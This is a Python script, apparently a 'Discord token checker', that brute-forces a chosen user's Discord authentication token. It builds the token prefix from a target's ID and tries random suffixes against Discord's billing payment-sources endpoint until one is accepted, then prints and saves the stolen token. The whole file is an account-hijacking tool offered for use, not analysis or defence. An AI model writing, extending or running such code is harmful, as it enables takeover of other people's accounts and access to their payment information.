print("Installing/loading requirements...")

from scripts.miscellaneous import *
from scripts.get_input import *
from scripts.install import *

install_requirements(check_requirements())
from os import name, getcwd, system
from requests import Session
from colorama import Fore
from time import sleep
from rstr import xeger


def main() -> None:
    try:
        check_folders()
        if name == "nt":
            system("title DISCORD TOKEN CHECKER - Made by Venu2HD#1761")
        SETTINGS: dict = get_config()
        START_BASE64, TARGET_UUID = get_target_BASE64(clear_screen)
        clear_screen()
        while True:
            full: str = f"{START_BASE64}.{'{}'}".format(
                xeger("^[A-Z]{1}([a-zA-Z0-9]){5}\.([a-zA-Z0-9_-]{38})$")
            )
            with Session() as session:
                response = session.get(
                    "http://discord.com/api/v9/users/@me/billing/payment-sources",
                    headers={"authorization": full},
                )
                if response.status_code == 200:
                    write_result(TARGET_UUID, full)
                    clear_screen()
                    if name == "nt":
                        input(
                            f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}\\results\\{TARGET_UUID}.txt{Fore.WHITE}\n"
                        )
                    else:
                        input(
                            f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}/results/{TARGET_UUID}.txt{Fore.WHITE}.txt\n"
                        )
                    exit()
                elif response.status_code == 401:
                    print(f"{Fore.RED}TESTED: {full}{Fore.WHITE}")
                else:
                    print(
                        f"{Fore.YELLOW}TIMEOUT FROM DISCORD API OR OTHER PROBLEM... WAITING {SETTINGS['timeout_in_seconds']}{Fore.WHITE}"
                    )
                    sleep(SETTINGS["timeout_in_seconds"])
    except KeyboardInterrupt:
        print("\n\n\nGOODBYE!")
        sleep(3)


if __name__ == "__main__":
    main()


